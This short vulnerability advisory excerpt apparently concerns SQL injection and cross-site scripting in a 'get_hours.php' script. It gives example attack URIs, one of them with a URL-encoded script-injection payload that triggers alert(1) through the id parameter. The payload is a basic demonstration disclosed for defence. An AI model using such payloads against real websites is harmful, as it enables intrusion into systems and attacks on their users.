Attackers can use a browser to exploit the SQL-injection issue. The attacker must trick an unsuspecting victim into following a malicious URI to exploit the cross-site scripting issue.

The following example URIs are available:

Cross-site scripting:

http://www.example.com/mods/hours/data/get_hours.php?id=XSS&amp;take=10&amp;skip=0&amp;page=1&amp;pageSize=10

http://www.example.com/mods/hours/data/get_hours.php?id=%27%22%3Cscript%3Ealert%281%29;%3C/script%3E&amp;take=10&amp;skip=0&amp;page=1&amp;pageSize=10
